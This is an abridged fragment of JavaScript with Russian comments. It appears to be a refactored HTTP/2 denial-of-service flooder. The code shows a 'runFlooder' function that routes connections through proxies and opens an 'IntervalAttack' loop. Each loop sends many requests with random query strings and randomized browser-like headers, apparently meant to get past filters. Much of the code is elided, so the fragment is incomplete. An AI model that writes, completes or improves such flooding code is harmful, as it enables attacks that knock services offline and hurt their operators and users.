...
// 2. TLS/Crypto параметры вынесены
const cplist = [
...
// cipper теперь глобальная константа
...
const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80"; // Вынесено
const MAX_RAM_PERCENTAGE = 95;
const RESTART_DELAY = 1000;

// 3. Базовые заголовки вынесены
const baseHeaders = {
...
// 4. Шаблон для proxyOptions вынесен
const proxyOptionsTemplate = {
  address: parsedTarget.host + ":443",
  timeout: 10
};

// 5. Настройки http2 вынесены
const h2Settings = {
...
// Настройки стрима для http2 запросов вынесены
...
// Шаблон tlsOptions вынесен в функцию
...
function runFlooder() {
  ...
  // proxyOptions теперь создается из шаблона
  const proxyOptions = {
  ...
  Socker.HTTP(proxyOptions, (connection, error) => {
    ...
    // tlsOptions теперь создается из шаблона-функции
    ...
    const client = http2.connect(parsedTarget.href, {
      ...
      // Настройки http2 теперь используются из глобальной константы
      settings: h2Settings,
    });
    ...
    client.on("connect", () => {
      const IntervalAttack = setInterval(() => {
        for (let i = 0; i < args.Rate; i++) {
          ...
          // Заголовки теперь создаются из базового шаблона + динамические
          const dynamicPath = parsedTarget.path + "?query=" + generateRandomString(10, 25);
          const headers = {
            ...baseHeaders,
            ":path": dynamicPath,
            "accept-encoding": encoding_header[getRandomInt(0, encoding_header.length - 1)],
            "sec-fetch-mode": fetch_mode[getRandomInt(0, fetch_mode.length - 1)],
            "sec-fetch-site": fetch_site[getRandomInt(0, fetch_site.length - 1)],
            "sec-fetch-dest": fetch_dest[getRandomInt(0, fetch_dest.length - 1)],
            "accept-Language": language_header[getRandomInt(0, language_header.length - 1)],
          };
          
          const request = client.request(headers, streamSettings)
